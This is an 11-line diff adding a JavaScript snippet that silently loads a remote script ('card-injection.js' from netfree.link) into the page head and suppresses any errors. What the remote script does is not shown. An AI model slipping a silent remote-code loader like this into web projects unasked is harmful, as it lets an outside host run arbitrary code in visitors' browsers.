@@ -1,0 +1,11 @@
+(function(window){
+try {
+    //old browser
+    if (!window.fetch) return;
+
+    var newScript  = document.createElement('script');
+    newScript.src  = "https://netfree.link/card/card-injection.js";
+    document.getElementsByTagName('head')[0].appendChild(newScript);
+
+} catch (e) {}
+})(window);
